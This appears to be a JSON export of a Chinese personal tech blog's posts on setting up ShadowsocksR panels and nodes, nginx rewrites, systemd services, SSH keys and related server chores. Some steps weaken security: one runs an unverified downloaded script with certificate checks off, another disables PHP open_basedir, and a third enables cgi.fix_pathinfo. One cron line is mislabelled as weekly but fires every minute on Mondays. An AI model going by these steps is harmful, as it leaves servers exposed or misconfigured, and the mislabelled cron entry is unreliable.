翻了下GitHub反馈页，作者说是 node_ss 表没有 name 字段，实际上只需要改动一个配置，解决办法： config/database.php 中 strict=true 改为 strict=false 问题3：更新代码后报错 1The only supported ciphers are AES-128-CBC and AES-256-CBC with the correct key lengths. 更新代码后，可能会出现这样的错误，其他时候可能数据库没导入会报其他错误，这个错误是少了 app key ，shell登录到服务器，切换到面板根目录下，运行以下命令即可： 1php artisan key:generate 运行完成后，就会在 .env 或者 storge/*.key 中将一窜随机字符写入，再打开就可以了。 其他问题 请参阅：SSRpanel搭建相关设置问题","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"SSR后端节点提示错误无法启动解决方法","slug":"ssrnode-start-with-error-exception","date":"2018-03-06T07:40:37.000Z","updated":"2018-03-06T07:40:37.000Z","comments":true,"path":"ssrnode-start-with-error-exception.html","permalink":"https://sobaigu.com/ssrnode-start-with-error-exception.html","excerpt":"装了个SSR分享面板，轻车熟路在自己的闲置VPS装了后端节点，可启动不成功。明明是轻车熟路，别的机器上也是这么装的，为啥就不成功？百思不得其解 启动时时抛出一堆错误如下：","text":"装了个SSR分享面板，轻车熟路在自己的闲置VPS装了后端节点，可启动不成功。明明是轻车熟路，别的机器上也是这么装的，为啥就不成功？百思不得其解 启动时时抛出一堆错误如下： 1234567891011121314151617181920212223242526272829[root@xx shadowsocksr]# ./server.py IPv6 supportException in thread Thread-1:Traceback (most recent call last): File &quot;/usr/lib64/python2.7/threading.py&quot;, line 812, in __bootstrap_inner self.run() File &quot;./server.py&quot;, line 39, in run self.obj.thread_db(self.obj) File &quot;/root/shadowsocksr/db_transfer.py&quot;, line 233, in thread_db ServerPool.get_instance() File &quot;/root/shadowsocksr/server_pool.py&quot;, line 69, in get_instance ServerPool.instance = ServerPool() File &quot;/root/shadowsocksr/server_pool.py&quot;, line 49, in __init__ self.config = shell.get_config(False) File &quot;/root/shadowsocksr/shadowsocks/shell.py&quot;, line 299, in get_config check_config(config, is_local) File &quot;/root/shadowsocksr/shadowsocks/shell.py&quot;, line 129, in check_config encrypt.try_cipher(config[&#x27;password&#x27;], config[&#x27;method&#x27;]) File &quot;/root/shadowsocksr/shadowsocks/encrypt.py&quot;, line 46, in try_cipher Encryptor(key, method) File &quot;/root/shadowsocksr/shadowsocks/encrypt.py&quot;, line 90, in __init__ random_string(self._method_info[1])) File &quot;/root/shadowsocksr/shadowsocks/encrypt.py&quot;, line 119, in get_cipher return m[2](method, key, iv, op) File &quot;/root/shadowsocksr/shadowsocks/crypto/sodium.py&quot;, line 71, in __init__ load_libsodium() File &quot;/root/shadowsocksr/shadowsocks/crypto/sodium.py&quot;, line 42, in load_libsodium raise Exception(&#x27;libsodium not found&#x27;)Exception: libsodium not found 之前一直纠结前面的 ...line 812, in __bootstrap_inner... 这些错误，搜索引擎各种查也没答案，倒是有问同样的问题的。 想想自己是在此次把加密方式换成了 chacha20-ietf ，改回去就好了。再返回来看错误，最后已经提示：libsodium not found 。既然是这样，那么解决此问题先： 1234567yum install wget m2crypto git libsodium -yyum -y groupinstall &quot;Development Tools&quot;wget https://github.com/jedisct1/libsodium/releases/download/1.0.16/libsodium-1.0.16.tar.gztar xf libsodium-1.0.16.tar.gz &amp;&amp; cd libsodium-1.0.16./configure &amp;&amp; make -j2 &amp;&amp; make installecho /usr/local/lib &gt; /etc/ld.so.conf.d/usr_local_lib.confldconfig 解决这个问题的途中可能还会出现其他问题，按提示一一解决即可。libsodium安装完成后再使用chacha20-ietf加密即可正常启动了。 参考文档","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"自动列出有更新的文章链接","slug":"auto-list-new-posts-by-git","date":"2018-03-02T09:03:56.000Z","updated":"2018-03-02T09:03:56.000Z","comments":true,"path":"auto-list-new-posts-by-git.html","permalink":"https://sobaigu.com/auto-list-new-posts-by-git.html","excerpt":"","text":"前言 用的Hexo博客，一直存在的问题是市面上的插件不是很多，有时候有些需求没法完成。 虽然有自动提交链接到百度的插件，但这个插件也有点鸡肋，如果你使用了百度统计，那本身就会带这个功能，这个插件也就不需要了。 现实需求 因为开通了百度熊掌号，所以有个需求：将更改或者新增的文章自动提交到百度熊掌号。 解决方案 在此之前，迷迷糊糊用了个 grep 来过滤含 index.html 的链接，以为带了这个就是在首页的文章，后来发现不是这么回事，因为一直都是那么几个链接，o(╯□╰)o。 1grep -r -l &#x27;index.html&#x27; * &gt;urllist.txt #这个思路是错误的 git思路 我的Hexo部署方案是自己有个VPS，然后VPS里装了git服务端和Hexo程序，MarkDown文档提交到VPS上的git仓库后，触发 post-receive 执行shell功能。 之前是在Hexo渲染完HTML文件后去处理，而Hexo每次渲染文件是全部重新生成的，时间特征不可取，所以解决思路是利用git日志，在MarkDown文件提交的时候知道哪个文档有增删改动，而且是准确的，将日志里出现的文件取出并拼接成外网链接，解决！ 123456789101112131415161718192021#!/bin/bashunset GIT_DIRGIT_REPO=/home/git/sobaigu.gitTMP_GIT_CLONE=/tmp/hexoHEXO_HOME=/home/git/sobaiguPUBLIC_WWW=/home/wwwroot/sobaigu.comrm -rf $&#123;TMP_GIT_CLONE&#125;git clone $GIT_REPO $TMP_GIT_CLONEcp -rf $&#123;TMP_GIT_CLONE&#125;/hexo/* $&#123;HEXO_HOME&#125;cd $&#123;HEXO_HOME&#125;hexo cleanhexo g #有些vps上连着写貌似会出现改时区设置什么的，导致&amp;&amp;无法执行下去hexo drm -rf $&#123;PUBLIC_WWW&#125;/*cp -rf $&#123;HEXO_HOME&#125;/public/* $&#123;PUBLIC_WWW&#125;### 将最新文章自动推送熊掌号和百度站在平台 ###cd $&#123;TMP_GIT_CLONE&#125;git diff --name-status HEAD^ &gt;gitdiff.logsed -e &#x27;s/^.*_posts\\/......../http:\\/\\/sobaigu.com\\//&#x27; -e &#x27;s/md$/html/&#x27; gitdiff.log &gt;urls.txtcurl -H &#x27;Content-Type:text/plain&#x27; --data-binary @urls.txt &quot;http://data.zz.baidu.com/urls?appid=xxx&amp;token=yyy&amp;type=realtime&quot;curl -H &#x27;Content-Type:text/plain&#x27; --data-binary @urls.txt &quot;http://data.zz.baidu.com/urls?site=sobaigu.com&amp;token=zzz&quot; 这里并未考虑删除的情况，无所谓 上面的 sed 写法请根据自己的实际情况增删改 解释 1git diff --name-status HEAD^ &gt;gitdiff.log 对比当前版本和上一次提交的文件区别，并输出文本，内容一般是这样的： 12M hexo/source/_posts/2017-07-how-to-use-shadowsocks-andriod.mdM hexo/source/_posts/2018-01-how-to-use-shadowsocks-ssr-andriod.md M 是有修改，D 是删除，A 是新增文件 1sed -e &#x27;s/^.*_posts\\/......../http:\\/\\/sobaigu.com\\//&#x27; -e &#x27;s/md$/html/&#x27; gitdiff.log &gt;urls.txt 用 sed 命令查找特征字符，并替换成我们要的链接，最后拼出来的效果便是： 12http://sobaigu.com/linux-shell-with-vps.htmlhttp://sobaigu.com/how-to-use-shadowsocks-ssr-andriod.html 最后用百度要求的 curl 命令规范提交就可以了。 参考文档 sed命令详解","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"SSH密钥生成与部署","slug":"ssh-keygen-copy-deploy","date":"2018-02-04T15:25:05.000Z","updated":"2018-02-04T15:25:05.000Z","comments":true,"path":"ssh-keygen-copy-deploy.html","permalink":"https://sobaigu.com/ssh-keygen-copy-deploy.html","excerpt":"","text":"生成 1ssh-keygen -t rsa -C &#x27;youremail@example.com&#x27; 一般默认回车确认就可以了，如果对秘钥保存不放心，那就设置个密码，每次Git客户端使用该秘钥的时候都要求输入密码才行。.pub是公钥，不带后缀的是私钥，两个文件尤其是私钥自己妥善保存。 部署 秘钥本地生成后上传到服务器也行，如果ssh登录一直出现需要密码，或者复制的密钥总是不对，可能是权限不对，那试试下面的方法，也推荐直接用命令拷贝，不必处理权限和文件名的的问题 1ssh-copy-id -i ~/.ssh/id_rsa.pub &#x27;username@githost&#x27; -p &#x27;ssh端口&#x27; 测试 使用文本编辑器打开将公钥文件，将里面所有的内容复制【喜欢操作命令直接用clip &lt; ~/.ssh/id_rsa.pub也行】，添加到Git账号或者项目部署公钥中，然后用以下命令测试： 1ssh -Tv &#x27;username@githost&#x27; -p &#x27;ssh端口&#x27; #测试ssh连接是否成功 其中-v是输出详细的调试信息，其他具体参数可见ssh帮助说明。如果如下显示信息则表示该秘钥部署正确。 12Coding 提示: Hello xxx, You&#x27;ve connected to Coding.net via SSH. This is a personal key.xxx，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥 多账户多秘钥问题 如果是不同平台，如GitHub和coding，那么你就生成一个公钥，分别添加到GitHub和coding平台上直接使用即可，生成不同的秘钥分别部署也行，他们并没有什么冲突。 这里要讲的是同一个平台不同账号，如在coding上自己有两个账号，同时在一个机器上使用。由于是同一个平台，添加同一个公钥的时候会提示该公钥已存在，此时你肯定想着新生成一个，可这样你会发现只会认到默认的，或者有A无B，有B无A。 如果希望两个公钥同时使用，还不出现 Permission Denied，那么还需要做如下改造： 编辑配置文件 ~/.ssh/config ，没有就新建：touch ~/.ssh/config 加入如下内容： 12345678910111213# 第一个秘钥Host user1.git.coding.net //别名1，这个别名一会儿推送要用到HostName git.coding.netUser user1PreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa# 第二个秘钥Host user2 //别名2，别名可以是任意字符串HostName git.coding.netUser user2PreferredAuthentications publickeyIdentityFile ~/.ssh/z_rsa 以上配置保存后，此时默认还是使用的默认的秘钥，非默认秘钥那个账户的仓库去操作的时候仍会出现 You have no permission to access this repo，要让你的仓库使用对应的秘钥，你需要将仓库地址用别名代替，如： 有个仓库地址，官方ssh地址是： 1git@git.coding.net:xxx/yyy.git 我们用别名2代替后为： 1git@user2:xxx/yyy.git 这里关键是用别名地址，这个坑反反复复试了n回！！！此时就能用上指定的秘钥推送或者拉取了。 参考文档 同一客户端下使用多个git账号 多 SSH Key 管理技巧与 Git 多账户登录问题 在一台电脑上使用两个Github账号","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"SS默认启用UDP支持","slug":"shadowsocks-enable-udp-default","date":"2018-01-28T07:25:16.000Z","updated":"2018-01-28T07:25:16.000Z","comments":true,"path":"shadowsocks-enable-udp-default.html","permalink":"https://sobaigu.com/shadowsocks-enable-udp-default.html","excerpt":"Shadowsocks默认是不启用UDP支持的，但最新的版本大多都支持，以Shadowsocks-Go版为例。 要安装可以使用别人做好的一键安装脚本，省心省力，比较有名的是秋水逸冰的那个，可以自己搬过来改改，适应自己的需求，比如下面这个：","text":"Shadowsocks默认是不启用UDP支持的，但最新的版本大多都支持，以Shadowsocks-Go版为例。 要安装可以使用别人做好的一键安装脚本，省心省力，比较有名的是秋水逸冰的那个，可以自己搬过来改改，适应自己的需求，比如下面这个： 12wget --no-check-certificate https://raw.githubusercontent.com/cdnf/shell/master/shadowsocks-go.shsh shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log 这个脚本都设置好了默认的，属于懒人用法，更多自己去研究。安装完成后，默认就已经支持UDP转发了。 如果不用我上面那个脚本，其实只需要在启动的时候添加-u参数就打开了UDP支持。一般脚本安装完成后，创建了一个Shadowsocks服务来启动，我们只需要在启动脚本里添加即可，下面的命令一步完成： 1sed -i &#x27;s/$BIN -c $CONF/$BIN -c $CONF -u/g&#x27; /etc/init.d/shadowsocks 重启服务即可看到支持UDP转发了 123[root@sobaigu ~]# netstat -npl | grep shadowsockstcp 0 0 :::9999 :::* LISTEN 17947/shadowsocks-s udp 0 0 :::9999 :::* 17947/shadowsocks-s","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"SSR客户端视频教程系列之：Android","slug":"how-to-use-ssr-in-android","date":"2018-01-27T12:09:43.000Z","updated":"2018-01-27T12:09:43.000Z","comments":true,"path":"how-to-use-ssr-in-android.html","permalink":"https://sobaigu.com/how-to-use-ssr-in-android.html","excerpt":"","text":"书接上文，话不多说，看视频。 一样的，配置方法有好多种，选择一种即可： 通过订阅节点自动更新【买账号的时候，一般服务商会提供一个订阅更新接口】 通过扫描二维码一键完成配置 通过导入剪贴板里的 ss:// 或 ssr:// 链接一键完成配置 视频中只演示了一种配置方法： 通过订阅节点自动更新【推荐这种方法，当服务商更改了服务器信息后，本地客户端软件重启自动更新同步】 不只是安卓客户端，其实所有平台的SSR客户端，如果是购买的服务商提供的SSR账号都应该用此种方法。其他的使用和Windows或Mac都大同小异，达到的效果都是一步完成了代理服务器信息的配置。当然，你也可以自己一个个信息填。 SSR安卓设备使用图文教程可见：Andriod版SSR客户端使用说明 首先，视频中会涉及账号等信息，没有的可往此处注册获取：免费酸酸乳账号获取方法 如果看不清视频在优土豆上无法通过审核，已将视频站在线播放链接删除，可点击这里下载原始视频文件或者直接在网盘中播放即可。","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"CentOS系统添加系统服务启动项","slug":"linux-add-service-startup","date":"2018-01-24T15:35:34.000Z","updated":"2018-01-24T15:35:34.000Z","comments":true,"path":"linux-add-service-startup.html","permalink":"https://sobaigu.com/linux-add-service-startup.html","excerpt":"","text":"基本说明 centos 7以上是用 Systemd 进行系统初始化的，Systemd 是 Linux 系统中最新的初始化系统（init），它主要的设计目标是克服 sysvinit 固有的缺点，提高系统的启动速度。 Systemd 服务文件以 .service 结尾，比如现在要建立nginx为开机启动，如果用 yum install 命令安装的，yum命令会自动创建 nginx.service 文件，直接用命令 systemcel enable nginx.service 设置开机启动即可。 实例：源码安装的手动添加nginx.service服务 在系统服务目录里创建nginx.service文件 1vi /lib/systemd/system/nginx.service 写入以下内容【注意路径】 1234567891011[Unit]Description=nginxAfter=network.target[Service]Type=forkingExecStart=/www/lnmp/nginx/sbin/nginx -c /www/lnmp/nginx/conf/nginx.confExecReload=/www/lnmp/nginx/sbin/nginx -s reloadExecStop=/www/lnmp/nginx/sbin/nginx -s quitPrivateTmp=true[Install]WantedBy=multi-user.target 将服务加入开机自启动 1systemctl enable nginx.service #注意后面不能跟空格 代码解释说明 12345678910Description:描述服务After:描述服务类别[Service]服务运行参数的设置Type=forking是后台运行的形式ExecStart为服务的具体运行命令ExecReload为重启命令ExecStop为停止命令PrivateTmp=True表示给服务分配独立的临时空间注意：[Service]的启动、重启、停止命令全部要求使用绝对路径[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3 服务命令使用实例 123456systemctl start nginx.service #启动nginx服务systemctl enable nginx.service #设置开机自启动systemctl disable nginx.service #停止开机自启动systemctl status nginx.service #查看服务当前状态systemctl restart nginx.service #重新启动服务systemctl list-units --type=service #查看所有已启动的服务","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"SSR客户端视频教程系列之：Windows","slug":"how-to-use-ssr-in-windows","date":"2018-01-22T12:09:43.000Z","updated":"2018-01-22T12:09:43.000Z","comments":true,"path":"how-to-use-ssr-in-windows.html","permalink":"https://sobaigu.com/how-to-use-ssr-in-windows.html","excerpt":"","text":"书接上文，话不多说，看视频。 视频中演示了三种配置方法： 通过订阅节点自动更新【推荐这种方法，当服务商更改了服务器信息后，本地客户端软件重启自动更新同步】 通过导入剪贴板中的ssr://信息一键完成 通过扫描屏幕二维码一键完成 以上三种方法选择一种即可，达到的效果都是一步完成了代理服务器信息的配置。当然，你也可以自己一个个信息填，本视频主要针对小白，这种以前做过的但被有效忽略的教程这次就没演示了。 首先，视频中会涉及账号等信息，没有的可往此处注册获取：免费酸酸乳账号获取方法 如果看不清，可 点击这里下载原始视频文件 或者直接在网盘中播放即可。 如果启动小飞机后发生断网现象，估计是你服务还没设置好，然后此时又设置了启用全局代理的原因，请在右下角托盘区找到小飞机：右键》系统代理模式 点击直连，或者：如果是SS则右键后在启用系统代理点下取消勾选，等设置好了服务器后再启用即可","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"SSR客户端视频教程系列之：MacOS【苹果电脑】","slug":"how-to-use-ssr-in-macos","date":"2018-01-21T04:05:25.000Z","updated":"2018-01-21T04:05:25.000Z","comments":true,"path":"how-to-use-ssr-in-macos.html","permalink":"https://sobaigu.com/how-to-use-ssr-in-macos.html","excerpt":"之前做过很多基础教程，但文字性的小白同学貌似都有效忽略了。。。 已经发表的图文教程请见 SSR使用基础教程 及其文内相关链接，愿看的或者已经会的就不用往下看了，真的都是基础教程。","text":"之前做过很多基础教程，但文字性的小白同学貌似都有效忽略了。。。 已经发表的图文教程请见 SSR使用基础教程 及其文内相关链接，愿看的或者已经会的就不用往下看了，真的都是基础教程。 这会儿，我打算做批视频教程，一个平台一个平台的客户端来示范，有了这些您该没什么好说的了吧？ 首先，视频中会涉及账号等信息，没有的可往此处注册获取：免费酸酸乳账号获取方法 下面就看视频吧，如果看不清，可 点击这里下载原始视频文件 或者直接在网盘中播放即可。 苹果系统下的SSR客户端强制使用 https 链接协议，如果由于客户端软件的问题，MacOS版本使用订阅节点无法成功获取节点信息，可以使用扫描屏幕二维码的功能直接添加节点服务器，缺点是如果服务商有更新不会像订阅链接那样自动同步更新。 如果启动小飞机后发生断网现象，估计是你服务还没设置好，然后此时又设置了启用全局代理的原因，请在托盘区找到小飞机：右键》系统代理模式 点击直连，如果是SS则右键后在启用系统代理点下取消勾选，苹果电脑客户端点击小飞机后点 关闭Shadowsocks代理 即可，等设置好了服务器后再启用即可","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"解决Nginx环境WordPress或Typecho设置固定链接无法打开的问题","slug":"nginx-path-index-with-wordpress-or-typecho","date":"2018-01-17T14:04:51.000Z","updated":"2018-01-17T14:04:51.000Z","comments":true,"path":"nginx-path-index-with-wordpress-or-typecho.html","permalink":"https://sobaigu.com/nginx-path-index-with-wordpress-or-typecho.html","excerpt":"做网站搭博客，首选都是自己买个国外VPS，400+一年费用一般比国内的虚拟空间稍贵点，但相比买虚拟空间VPS好太多： 私有独享ip 足够多的存储空间：基本上都是10G起，要放什么文件都可以，数据库也可以随意多个 足够多的流量：一般都是500G起，相比虚拟主机的10G优越不是一点两点，几个朋友一起用都不是什么问题 最重要的是，境外VPS还有其他的用途：比如翻墙梯 当然，国外VPS也有个比不了的，那就是速度没有国内的虚拟主机快，但不需要备案啊！！！而且，就一个小网页，速度差别几乎感受不到。","text":"做网站搭博客，首选都是自己买个国外VPS，400+一年费用一般比国内的虚拟空间稍贵点，但相比买虚拟空间VPS好太多： 私有独享ip 足够多的存储空间：基本上都是10G起，要放什么文件都可以，数据库也可以随意多个 足够多的流量：一般都是500G起，相比虚拟主机的10G优越不是一点两点，几个朋友一起用都不是什么问题 最重要的是，境外VPS还有其他的用途：比如翻墙梯 当然，国外VPS也有个比不了的，那就是速度没有国内的虚拟主机快，但不需要备案啊！！！而且，就一个小网页，速度差别几乎感受不到。 错误现象 自己的VPS就需要自己维护了，就是一台远程的电脑，你自己能折腾出花来都行。自己不会折腾找卖家装好环境自己用就行。 一般搭网站用LNMP环境，对于静态网站，nginx默认设置就行，但对于WordPress或者Typecho这种动态站点，默认会出现设置带目录的链接时无法打开的情况。 1234http://xxx.com/blog/http://xxx.com/2018/http://xxx.com/%postname%.html 不加设置以上形式的链接都会出现404错误。 解决办法 不支持目录链接是因为缺少伪静态规则，我们只需要按以下方法添加伪静态即可。 添加伪静态规则 Nginx环境下WordPress或者Typecho伪静态规则如下： 123456789101112location / &#123; index index.html index.php; if (-f $request_filename/index.html) &#123; rewrite (.*) $1/index.html break; &#125; if (-f $request_filename/index.php) &#123; rewrite (.*) $1/index.php; &#125; if (!-f $request_filename) &#123; rewrite (.*) /index.php; &#125; &#125; 以上规则在nginx或者vhost配置中修改都可以。保存配置后，重启nginx一般就正常了。 开启PATHINFO 如果Typecho访问内页出现No input file specified错误提示，那么是没有开启pathinfo的支持。 方法： 找到/usr/local/php/etc/php.ini文件，将cgi.fix_pathinfo=0 改成 cgi.fix_pathinfo=1,保存后输入命令：service php-fpm重启php-fpm 即可。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Linux系统设置系统时区为中国时间","slug":"linux-set-timezone","date":"2018-01-15T09:36:22.000Z","updated":"2018-01-15T09:36:22.000Z","comments":true,"path":"linux-set-timezone.html","permalink":"https://sobaigu.com/linux-set-timezone.html","excerpt":"美国vps，默认是UTC0，也就是+00时区，但用户主要是国内，所以需要把服务器时间改为CST。 本来很简单的一件事，就是替换下时区文件即可： 12cp -f /usr/share/zoneinfo/Asia/Shanghai /etc/localtime#提示是否覆盖，输入y","text":"美国vps，默认是UTC0，也就是+00时区，但用户主要是国内，所以需要把服务器时间改为CST。 本来很简单的一件事，就是替换下时区文件即可： 12cp -f /usr/share/zoneinfo/Asia/Shanghai /etc/localtime#提示是否覆盖，输入y 改了n遍死活就是不能改时区，tzselect命令也用上了，始终是不对 网上又说要改另外一个文件，照着改： 1vim /etc/sysconfig/clock ZONE=“Asia/Shanghai” UTC=false ARC=false 重启依然是UTC+00时间…… 偶然ll /etc/localtime看了下，居然链接的是UCT文件，再看了下/usr/share/zoneinfo/Asia/Shanghai，里面的内容就是UTC0，最后从其他系统里拷贝一个Shanghai文件替换解决。date命令可见时区已经改成CST了。 Sun Jan 14 17:49:26 CST 2018 为了避免时间差，yum install ntp安装时间同步服务，然后添加个自动同步时间的任务 12* * * * 1 ntpdate cn.pool.ntp.org &gt;&gt; /dev/null 2&gt;&amp;1#每周1同步一次","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Andriod版SSR客户端使用说明","slug":"how-to-use-shadowsocks-ssr-andriod","date":"2018-01-13T09:23:28.000Z","updated":"2018-01-13T09:23:28.000Z","comments":true,"path":"how-to-use-shadowsocks-ssr-andriod.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-ssr-andriod.html","excerpt":"","text":"前言 Shadowsocks是个强大的梯子软件，其原版简单高效，虽然作者被请喝茶后也有别人接手，但其协议特征也渐渐被功夫网研究透彻，所以有时候还是需要后续的ShadowsocksR等改版的功能。 因为是改版，而且技术实现方向也不一致，所以有些协议是不兼容的，不得已需要用专门的ShadowsocksR客户端来使用最新的协议，以保证流量安全。 安卓版ShadowsocksR客户端下载 按惯例，如果没有账号，可以去购买VPS自己动手装上服务端享受私有服务，或者免费获取一个公共账号『免费的就别要求要配自行车了』，已经有账号的飘过即可。 Android-shadowsocksr点此下载，墙内下载可到此处。 其他平台客户端下载及使用请见：SSR使用基础教程 安卓客户端使用简单说明 之所以叫简单说明，是因为本身也不需要复杂说明，都是一些中文界面化的配置。启动软件后，会默认有个配置，这个配置当然是几乎不能用，所以我们可以点击修改此配置或者左右滑动删除默认配置再额外新增一个。 点击左上角的 ShadowsocksR 文字logo即可跳转到新增配置界面，点击右下角的+号即可弹出添加服务器方法。 强烈建议使用下图中第一行的 添加/升级SSR订阅 的配置方法，通过这种方法会自动更新服务器各种参数 选择一种方法添加服务器信息，SSR服务信息可从服务商那获取，详见：免费酸酸乳账号获取方法 一般扫码或者使用订阅地址一步就可以搞定配置，直接点击连接就能用了，如果有个性配置的需求，请点击配置名称即可跳转到手动配置界面，能自己自定义的地方按自己的需求改即可。 建议小白就不要动了，按服务商提供的配完直接用就行了 到此，安卓上使用最新协议的科学上网利器就能正常使用了，更多平台客户端使用方法请见：Shadowsocks常见问题整理","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"SSRpanel搭建相关设置问题","slug":"shadowsocks-ssrpanel-setting","date":"2018-01-12T07:10:54.000Z","updated":"2018-01-12T07:10:54.000Z","comments":true,"path":"shadowsocks-ssrpanel-setting.html","permalink":"https://sobaigu.com/shadowsocks-ssrpanel-setting.html","excerpt":"","text":"前言 搭了个自助分享SSR的平台，供亲朋好友获取资源所用。用了SSR面板，功能很实用也够用。 在搭建过程中，基本上根据官方说明文档都能一步步完成，在邮件通知提醒配置时费了不少事，而且胖虎的邮件配置示例有误导性，将这些坑整理下。 最近看到不少小白在项目下提issue，好多人文档看了当白看，或者也没舍得多动下手，也是让人倍感无力 加入NGINX的URL重写规则 在搭建环境最后一步，有个加入NGINX的URL重写规则如下： 123location / &#123; try_files $uri $uri/ /index.php$is_args$args;&#125; 这一步直接复制说明文档代码到nginx配置中有可能会出现nginx报错，请多注意结尾符，原配置是不是已经包含根目录的规则等，详见Nginx Location语法与简单配置 出现500错误 官方提及的是出现 open_basedir错误，照官方wiki文档先操作 1234vim /usr/local/nginx/conf/fastcgi.conf#找到下面这句把它注释掉fastcgi_param PHP_ADMIN_VALUE &quot;open_basedir=$document_root/:/tmp/:/proc/&quot;; #保存 重启nginx 且 重启 php-fpm 如果不灵验，注意检查是不是站点文件权限有问题，用chown -R www:www命令更改一遍，再不行检查nginx设置。 其他错误可见：解决SSRPanel面板用户登录报错 定时任务 发邮件、流量统计、自动任务全部需要用到，所以出现流量统计为0，用户过期不自动禁用等问题请检查定时任务状态，官方文档如是： 123# crontab加入如下命令：* * * * * php /home/wwwroot/ssrpanel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1# 请自行修改ssrpanel路径 该定时任务表示每分钟都执行定时任务，具体什么任务什么时候执行程序里已经定义了，请不要乱改，否则流量统计数据可能出错 官方没有提用哪个用户，站点属于 www 用户，如果任务属于 root ，那么创建的log文件属于 root，到时候操作面板上的功能会触发报错： 123(1/1) UnexpectedValueExceptionThe stream or file &quot;xxx/laravel-2018-01-09.log&quot; could not be opened: failed to open stream: Permission denied 如果要解决这个问题，我们需要将任务计划指定给 www 用户执行，用下面的命令编辑定时任务： 1crontab -e -u www 填入对应的任务计划，原先root的任务删除掉即可。如果定时任务不执行，请检查是不是 www 目录不存在，详见：记一次系统任务无法正常执行 SMTP邮件发信配置 一如既往的按官方文档操作，编辑 config\\mail.php ，配置如下内容： 12345678910&#x27;driver&#x27; =&gt; &#x27;smtp&#x27;,&#x27;host&#x27; =&gt; &#x27;smtp.exmail.qq.com&#x27;, #如果不是企业邮箱，请把`.exmail`这节去掉&#x27;port&#x27; =&gt; 465,&#x27;from&#x27; =&gt; [ &#x27;address&#x27; =&gt; &#x27;xxx@qq.com&#x27;, &#x27;name&#x27; =&gt; &#x27;SSRPanel&#x27;,],&#x27;encryption&#x27; =&gt; &#x27;ssl&#x27;,&#x27;username&#x27; =&gt; &#x27;xxx@qq.com&#x27;,&#x27;password&#x27; =&gt; &#x27;xxxxxx&#x27;, #这里不是你邮箱密码，是开启功能时腾讯给你的授权码 懒得换其他邮箱都直接用了示例的QQ邮箱配置，请注意下 host 和 password 配置。如果用其他邮箱发信请参照其他邮箱服务商的文档配置即可。 新版面板的mailgun发信设置 最新版本升级后，一些配置发生了变更，但并没有看到胖虎在更新日志或文档里体现，需要做对应的修改。 新版邮件配置放到了网站根目录下的 .env 中： 1234567891011121314151617QUEUE_DRIVER=redis 